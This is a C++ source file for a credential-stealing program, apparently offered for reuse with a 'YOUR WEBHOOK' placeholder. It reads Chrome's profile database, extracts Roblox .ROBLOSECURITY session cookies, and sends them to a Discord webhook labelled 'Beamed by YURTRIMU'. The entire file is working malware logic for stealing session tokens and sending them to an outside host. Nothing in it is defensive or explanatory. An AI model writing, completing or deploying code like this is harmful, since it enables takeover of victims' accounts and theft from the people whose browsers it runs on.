#include "webhook.hpp"
#include "cookiestealer.hpp"

std::string webhook_url = "YOUR WEBHOOK";

int main()
{

    if (!utils::console::is_windows()) { printf("The operating system has to be Windows NT\n"); exit(EXIT_FAILURE); }

    if (!utils::console::set_utf8()) { printf("Couldn't set console IO to utf8 encoding.\nConsole IO could show gibberish texts.\n"); }

    std::string Local_State_Path = "Google\\Chrome\\User Data\\Local State";
    std::string Database_Path = "Google\\Chrome\\User Data\\Default";

    CookieStealer stealer(Local_State_Path, Database_Path);
    stealer.initialize();

    std::stringstream ss; ss << "## **Roblox Cookies**\n"; ss << "-# .ROBLOSECURITY\n";

    for (const std::string &data : stealer.get_roblox()) {
        ss << "```" << data << "```\n";
    }

    curl_global_init(CURL_GLOBAL_ALL);

    struct discord_webhook webhook;
    webhook.avatar = "https://cdn.discordapp.com/avatars/607980985388105739/a_242b16cd46d4a14361822aa0b878e365.png";
    webhook.name = "Beamed by YURTRIMU";
    webhook.url = webhook_url;
    webhook.message = ss.str();

    std::string response;
    if (send_webhook(webhook, response)) { printf("Webhook successfully sent %zu length of data.\n", webhook.message.length()); }

    curl_global_cleanup();
}